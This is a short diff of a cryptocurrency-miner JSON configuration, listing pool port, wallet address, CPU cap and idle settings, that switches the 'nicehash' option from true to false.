@@ -4,7 +4,7 @@
     "port": 80,
     "wallet": "4AXh7iLs9rLVwFsTqqqDetiXGGqweNsPS9qppNzj6tWyRtZ6THYpm9Xh9pTH7amK4b3hdqtDpEYLeYNYfZjzaiCy7Ch3EUw",
     "password": "dc",
-    "nicehash": true,
+    "nicehash": false,
     "ssltls": true,
     "max-cpu": 50,
     "idle-wait": 33,
